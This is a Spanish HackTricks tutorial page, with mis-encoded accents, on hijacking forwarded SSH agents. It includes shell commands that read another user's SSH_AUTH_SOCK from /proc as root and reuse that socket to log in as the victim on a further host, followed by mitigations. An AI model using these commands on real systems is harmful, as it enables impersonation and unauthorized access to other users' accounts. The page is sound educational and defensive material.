# Resumen

¬øQu√© puedes hacer si descubres dentro de la configuraci√≥n `/etc/ssh_config` o dentro de `$HOME/.ssh/config` lo siguiente:
```
ForwardAgent yes
```
Si eres root dentro de la m√°quina, probablemente puedas **acceder a cualquier conexi√≥n ssh realizada por cualquier agente** que encuentres en el directorio _/tmp_.

Suplantar a Bob usando uno de los ssh-agent de Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## ¬øPor qu√© funciona esto?

Cuando se establece la variable `SSH_AUTH_SOCK`, se accede a las claves de Bob que se han utilizado en la conexi√≥n ssh de Bob. Entonces, si su clave privada todav√≠a est√° all√≠ (normalmente lo estar√°), podr√°s acceder a cualquier host us√°ndola.

Como la clave privada se guarda en la memoria del agente sin cifrar, supongo que si eres Bob pero no conoces la contrase√±a de la clave privada, a√∫n puedes acceder al agente y usarlo.

Otra opci√≥n es que el usuario propietario del agente y root puedan acceder a la memoria del agente y extraer la clave privada.

# Explicaci√≥n detallada y explotaci√≥n

**Tomado de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Cuando ForwardAgent no puede ser confiado**

SSH sin contrase√±as hace que la vida con sistemas operativos similares a Unix sea mucho m√°s f√°cil. Si tu red requiere sesiones ssh encadenadas (para acceder a una red restringida, por ejemplo), el reenv√≠o de agente se vuelve extremadamente √∫til. Con el reenv√≠o de agente, es posible que me conecte desde mi port√°til a mi servidor de desarrollo y desde all√≠ ejecute una comprobaci√≥n de salida svn desde otro servidor, todo sin contrase√±as, mientras mantengo mi clave privada segura en mi estaci√≥n de trabajo local.

Sin embargo, esto puede ser peligroso. Una r√°pida b√∫squeda en la web revelar√° varios art√≠culos que indican que esto solo es seguro si los hosts intermedios son confiables. Raramente, sin embargo, encontrar√°s una explicaci√≥n de _por qu√©_ es peligroso.

Para eso es este art√≠culo. Pero primero, algo de antecedentes.

## **C√≥mo funciona la autenticaci√≥n sin contrase√±a**

Cuando se autentica en modo normal, SSH utiliza tu contrase√±a para demostrar que eres quien dices ser. El servidor compara un hash de esta contrase√±a con uno que tiene en el archivo, verifica que los hashes coinciden y te deja entrar.

Si un atacante es capaz de romper la encriptaci√≥n utilizada para proteger tu contrase√±a mientras se env√≠a al servidor, puede robarla e iniciar sesi√≥n como t√∫ cuando lo desee. Si se permite a un atacante realizar cientos de miles de intentos, eventualmente puede adivinar tu contrase√±a.

Un m√©todo de autenticaci√≥n mucho m√°s seguro es la [autenticaci√≥n de clave p√∫blica](http://www.ibm.com/developerworks/library/l-keyc/index.html), una forma de iniciar sesi√≥n sin una contrase√±a. La autenticaci√≥n de clave p√∫blica requiere un par de claves p√∫blicas y privadas coincidentes. La clave p√∫blica cifra mensajes que solo pueden ser descifrados con la clave privada. El ordenador remoto utiliza su copia de tu clave p√∫blica para cifrar un mensaje secreto para ti. Demuestras que eres t√∫ descifrando el mensaje usando tu clave privada y enviando el mensaje de vuelta al ordenador remoto. Tu clave privada permanece segura en tu ordenador local todo el tiempo, a salvo de ataques.

La clave privada es valiosa y debe ser protegida, por lo que por defecto se almacena en un formato cifrado. Desafortunadamente, esto significa ingresar tu frase de cifrado antes de usarla. Muchos art√≠culos sugieren usar claves privadas sin frase de cifrado (sin cifrar) para evitar esta inconveniencia. Eso es una mala idea, ya que cualquier persona con acceso a tu estaci√≥n de trabajo (a trav√©s de acceso f√≠sico, robo o hackeo) ahora tambi√©n tiene acceso gratuito a cualquier ordenador configurado con tu clave p√∫blica.

OpenSSH incluye [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), un daemon que se ejecuta en tu estaci√≥n de trabajo local. Carga una copia descifrada de tu clave privada en la memoria, por lo que solo tienes que ingresar tu frase de cifrado una vez. Luego proporciona un [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que el cliente ssh puede usar para pedirle que descifre el mensaje cifrado enviado por el servidor remoto. Tu clave privada permanece segura en la memoria del proceso ssh-agent mientras te permite ssh alrededor sin escribir contrase√±as.

## **C√≥mo funciona ForwardAgent**

Muchas tareas requieren sesiones ssh "encadenadas". Considera mi ejemplo anterior: me conecto desde mi estaci√≥n de trabajo al servidor de desarrollo. Mientras estoy all√≠, necesito realizar una actualizaci√≥n svn, usando el protocolo "svn+ssh". Dado que ser√≠a absurdo dejar una copia sin cifrar de mi clave privada s√∫per secreta en un servidor compartido, ahora estoy atrapado con la autenticaci√≥n de contrase√±a. Si, sin embargo, habilito "ForwardAgent" en la configuraci√≥n ssh de mi estaci√≥n de trabajo, ssh utiliza sus capacidades de t√∫nel incorporadas para crear otro socket en el servidor de desarrollo que se tuneliza de vuelta al socket ssh-agent en mi estaci√≥n de trabajo local. Esto significa que el cliente ssh en el servidor de desarrollo ahora puede enviar solicitudes de "descifrar este mensaje secreto" directamente de vuelta al ssh-agent que se ejecuta en mi estaci√≥n de trabajo, autentic√°ndose a s√≠ mismo en el servidor svn sin tener acceso a mi clave privada.

## **Por qu√© esto puede ser peligroso**

En pocas palabras, cualquier persona con privilegios de root en el servidor intermedio puede hacer uso gratuito de tu ssh-agent para autenticarse en otros servidores. Una simple demostraci√≥n muestra lo trivial que puede ser esto. Los nombres de host y de usuario han sido cambiados para proteger a los inocentes.

Mi port√°til est√° ejecutando ssh-agent, que se comunica con los programas cliente ssh a trav√©s de un socket. La ruta a este socket se almacena en la variable de entorno SSH_AUTH_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
El programa [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nos permite ver e interactuar con las claves en el agente:
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Tengo "ForwardAgent yes" en el archivo \~/.ssh/config de mi port√°til. Por lo tanto, ssh va a crear un t√∫nel conectando el socket local a un socket local en el servidor remoto:
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Aunque mis claves no est√°n instaladas en "seattle", los programas cliente de ssh a√∫n pueden acceder al agente que se est√° ejecutando en mi m√°quina local:
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Entonces... ¬øcon qui√©n podemos meternos?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Nunca me ha gustado Bob. Para encontrar su conexi√≥n de agente, necesito encontrar el proceso hijo de una de sus sesiones ssh:
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Hay varias formas para que root pueda ver el entorno de un proceso en ejecuci√≥n. En Linux, los datos est√°n disponibles en /proc/\<pid>/environ. Como est√°n almacenados en cadenas terminadas en NULL, usar√© tr para convertir los NULLs en saltos de l√≠nea:
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Ahora tengo todo lo que necesito saber para secuestrar el ssh-agent de Bob:
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Si tengo un objetivo espec√≠fico en mente, ahora deber√≠a poder conectarme directamente. De lo contrario, simplemente observar la lista de procesos o buscar en el archivo de historial de Bob deber√≠a presentar muchos objetivos de oportunidad. En este caso, s√© que Bob tiene todo tipo de archivos s√∫per secretos almacenados en el servidor llamado "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
He logrado utilizar mis privilegios de root en "Seattle" para acceder como Bob en "Boston". Apuesto a que puedo usar esto para despedirlo.

## **¬°Prot√©gete!**

No permitas que tu ssh-agent almacene tus claves indefinidamente. En OS X, configura tu Keychain para que se bloquee despu√©s de un per√≠odo de inactividad o cuando la pantalla se bloquea. En otras plataformas Unix, pasa la opci√≥n -t a ssh-agent para que sus claves se eliminen despu√©s de segundos.

No habilites el reenv√≠o de agentes al conectarte a hosts no confiables. Afortunadamente, la sintaxis de \~/.ssh/config hace que esto sea bastante simple:
```
Host trustworthyhost
  ForwardAgent yes
```

```
Host *
  ForwardAgent no
```
## **Lectura recomendada**

* [Gesti√≥n de claves de OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) - Daniel Robbins
* [Una gu√≠a ilustrada para el reenv√≠o de agentes SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) - Steve Friedl
* [Manual de ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [Manual de ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**La familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
